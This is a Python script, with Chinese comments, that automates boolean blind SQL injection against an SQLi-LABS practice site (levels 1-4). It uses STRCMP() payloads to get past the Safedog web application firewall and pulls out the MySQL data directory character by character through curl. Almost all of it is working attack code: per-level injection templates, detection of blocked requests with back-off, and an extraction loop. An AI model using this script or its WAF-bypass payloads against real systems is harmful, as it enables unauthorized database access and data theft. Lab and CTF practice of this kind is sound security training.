#!/usr/bin/env python3
"""
SQLi-LABS WAF绕过 - 统一批量盲注脚本 v5.0
目标: http://sql.ctfstu.uk:1685/sql/
WAF: 安全狗 (Safedog)
方法: STRCMP() 布尔盲注

Less 1-4 均可用 STRCMP 注入
Less 5+ 返回非标准内容，需要单独处理
"""

import subprocess
import re
import sys
import time
from urllib.parse import quote

UA = "Mozilla/5.0 (X11; Linux x86_64)"
TARGET_TMPL = "http://sql.ctfstu.uk:1685/sql/Less-{}/?id="

CHARS = " !#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~\""

DELAY = 0.05

class Injector:
    def __init__(self, less_n):
        self.n = less_n
        self.target = TARGET_TMPL.format(less_n)
        self.n_req = 0
        self.n_waf = 0
        
        # 根据关卡确定闭合方式
        if less_n == 1:
            self.prefix = "1'=strcmp(left({s},{n}),'{g}')='1"
        elif less_n == 2:
            self.prefix = "1=strcmp(left({s},{n}),'{g}')"
        elif less_n == 3:
            self.prefix = "1')=strcmp(left({s},{n}),'{g}')='1'#"
        elif less_n == 4:
            self.prefix = "1\")=strcmp(left({s},{n}),'{g}')='1'#"
        else:
            self.prefix = None
    
    def req(self, payload):
        url = self.target + quote(payload, safe='')
        try:
            r = subprocess.run(["/usr/bin/curl", "-s", url, 
                               "-H", f"User-Agent: {UA}"],
                              capture_output=True, timeout=8)
            resp = r.stdout.decode('latin-1')
            self.n_req += 1
            
            if "Angelina" in resp:
                return "ANGELINA"  # strcmp=0 (相等)
            if "Dumb" in resp or "Your Login name" in resp:
                return "DUMB"      # strcmp=1 (left>guess)
            if "safedog" in resp or "厦门" in resp:
                self.n_waf += 1
                time.sleep(2)
                return "WAF"
            return "EMPTY"          # strcmp=-1 (left<guess)
        except:
            return "ERROR"
    
    def cmp(self, source, n, guess, min_len_check=3):
        """strcmp(left(source, n), 'guess')"""
        escaped = guess.replace("\\", "\\\\").replace("'", "\\'")
        payload = self.prefix.format(s=source, n=n, g=escaped)
        return self.req(payload)
    
    def is_angelina(self, source, n, guess):
        return self.cmp(source, n, guess) == "ANGELINA"
    
    def extract(self, source, name, max_len=50):
        print(f"\n  📡 [{name}] {source}")
        result = ""
        for pos in range(1, max_len + 1):
            found = False
            for c in CHARS:
                if c == "'" and self.n in [2]:
                    continue  # Less-2 数字型没有引号包裹，单引号可能破坏SQL
                guess = result + c
                if self.is_angelina(source, pos, guess):
                    result += c
                    sys.stdout.write(f"    [{pos:3d}] '{c}' → {result}\r")
                    sys.stdout.flush()
                    time.sleep(DELAY)
                    found = True
                    break
            if not found:
                break
        
        print(f"    [{pos:3d}] ✅ {name} = {result}")
        return result.strip()


def main():
    print("""
╔══════════════════════════════════════════════════════════════╗
║   SQLi-LABS 安全狗WAF绕过 - 统一批量盲注 v5.0               ║
║   方法: STRCMP(left(expr,N),'guess') == 0 → Angelina        ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    # 先验证所有关卡的工作状态
    targets_extract = [1, 2, 3, 4]
    
    for less_n in targets_extract:
        print(f"\n{'='*60}")
        print(f"📡 Less-{less_n}")
        print(f"{'='*60}")
        
        bj = Injector(less_n)
        if bj.prefix is None:
            print("  ❌ 不支持该关卡")
            continue
        
        # 验证
        r = bj.cmp("@datadir", 1, "C")
        if r == "ANGELINA":
            print(f"  ✅ 注入句式可用，@@datadir[1]='C'")
        else:
            print(f"  ⚠️ 注入句式: {r}")
        
        # 提取数据
        bj.extract("@@datadir", "MySQL数据目录")
        
        stats = f"请求={bj.n_req}, WAF拦截={bj.n_waf}"
        print(f"  📊 {stats}")
    
    print("\n\n🎉 全部完成！")


if __name__ == "__main__":
    main()
